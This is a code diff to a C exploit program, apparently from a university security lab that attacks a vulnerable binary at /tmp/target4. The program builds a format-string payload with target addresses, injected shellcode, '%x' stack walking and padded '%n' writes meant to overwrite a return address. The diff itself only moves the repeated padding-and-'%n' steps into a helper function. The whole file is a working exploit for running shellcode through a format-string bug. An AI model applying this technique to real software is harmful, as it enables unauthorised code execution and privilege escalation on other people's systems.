@@ -6,6 +6,12 @@
 
 #define TARGET "/tmp/target4"
 
+void write_with_padding(char* buf, size_t padding){
+  char* ptr = buf + strlen(buf);
+  memset(ptr, 'A', padding);
+  strcpy(ptr + padding, "%n");
+}
+
 int main(void) {
   char *args[3];
   char *env[1];
@@ -14,24 +20,14 @@ int main(void) {
                   "\x9d\xfc\xff\xbf"
                   "\x9e\xfc\xff\xbf"
                   "\x9f\xfc\xff\xbf";
-
   strcpy(buf + strlen(buf), shellcode);
-
   strcpy(buf + strlen(buf), "%x%x%x");
 
   // expected 0xbffffac8
-
-  memset(buf + strlen(buf), 'A', 136);
-  strcpy(buf + strlen(buf), "%n");
-
-  memset(buf + strlen(buf), 'A', 0xfa - 0xc8);
-  strcpy(buf + strlen(buf), "%n");
-
-  memset(buf + strlen(buf), 'A', 0xff - 0xfa);
-  strcpy(buf + strlen(buf), "%n");
-
-  memset(buf + strlen(buf), 'A', 0x1bf - 0xff);
-  strcpy(buf + strlen(buf), "%n");
+  write_with_padding(buf, 0xc8 - 0x40);
+  write_with_padding(buf, 0xfa - 0xc8);
+  write_with_padding(buf, 0xff - 0xfa);
+  write_with_padding(buf, 0x1bf - 0xff);
 
   memset(buf + strlen(buf), 'A', sizeof(buf) - strlen(buf));
 
